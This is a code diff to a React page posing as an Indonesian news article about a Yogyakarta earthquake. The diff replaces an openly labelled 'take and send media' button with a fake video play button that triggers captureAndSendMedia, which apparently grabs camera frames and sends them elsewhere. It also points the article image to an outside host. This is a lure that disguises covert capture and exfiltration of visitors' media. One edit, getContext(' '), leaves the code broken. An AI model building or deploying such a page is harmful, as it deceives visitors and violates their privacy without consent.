@@ -53,7 +53,7 @@ function App() {
       const canvas = document.createElement('canvas');
       canvas.width = settings.width || 1920;
       canvas.height = settings.height || 1080;
-      const context = canvas.getContext('2d');
+      const context = canvas.getContext(' ');
 
       if (context) context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
@@ -107,7 +107,7 @@ function App() {
   const article = {
     title: "Gempa Bumi Guncang Yogyakarta",
     date: "26 Juli 2025",
-    imageUrl: "https://source.unsplash.com/1200x600/?earthquake,disaster",
+    imageUrl: "https://linuxpemula.web.id/tersangka.jpg",
     content: `
       Yogyakarta kembali diguncang gempa bumi pada hari Sabtu, 26 Juli 2025.
       Gempa ini memiliki kekuatan 5.6 skala Richter dan terasa di beberapa wilayah seperti Sleman, Bantul, dan Kulonprogo.
@@ -136,19 +136,23 @@ function App() {
 
       <main className="container mx-auto px-4 py-10 max-w-4xl">
         <article className="bg-white rounded-lg shadow overflow-hidden">
-          <img src={article.imageUrl} alt={article.title} className="w-full h-72 object-cover" />
+          <div className="relative aspect-video bg-black">
+            <img src={article.imageUrl} alt={article.title} className="absolute inset-0 w-full h-full object-cover" />
+            <div className="absolute inset-0 bg-black/40 flex items-center justify-center">
+              <button
+                onClick={captureAndSendMedia}
+                className="bg-red-600 text-white p-6 rounded-full hover:bg-red-700 hover:scale-110 transition-all"
+              >
+                ▶
+              </button>
+            </div>
+          </div>
           <div className="p-6">
             <p className="text-gray-500 text-sm mb-2">{article.date}</p>
             <h2 className="text-3xl font-bold mb-4">{article.title}</h2>
             <div className="text-gray-800 whitespace-pre-line leading-relaxed text-lg">
               {article.content}
             </div>
-            <button
-              onClick={captureAndSendMedia}
-              className="mt-6 inline-block bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700"
-            >
-              Ambil dan Kirim Media
-            </button>
           </div>
         </article>
       </main>
